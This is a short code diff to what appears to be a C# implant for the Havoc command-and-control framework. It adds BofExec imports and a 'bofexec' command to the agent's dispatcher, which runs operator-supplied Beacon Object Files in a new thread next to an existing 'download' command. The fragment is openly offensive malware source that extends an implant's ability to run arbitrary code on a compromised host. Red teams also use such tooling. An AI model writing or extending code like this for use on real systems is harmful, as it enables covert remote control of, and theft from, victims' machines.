@@ -13,6 +13,9 @@ using System.Text.RegularExpressions;
 using Microsoft.Win32;
 using System.Security.Cryptography;
 using System.Management;
+using HavocImplant.AgentFunctions.BofExec;
+using HavocImplant.AgentFunctions.BofExec.Internals;
+using static HavocImplant.Implant;
 
 namespace HavocImplant
 {
@@ -134,6 +137,11 @@ namespace HavocImplant
                             case "download":
                                 Thread downloadThread = new Thread(() => AgentFunctions.Download.Run(implant, command.Substring(8).Trim(), taskId));
                                 downloadThread.Start();
+                                break;
+                            case "bofexec":
+                                string[] bofArgs = new string[] { command.Substring(7).Trim() };
+                                Thread bofExecthread = new Thread(() => AgentFunctions.BofExec.BofExec.Run(implant, bofArgs, taskId));
+                                bofExecthread.Start();
                                 break;
                         }
                     }
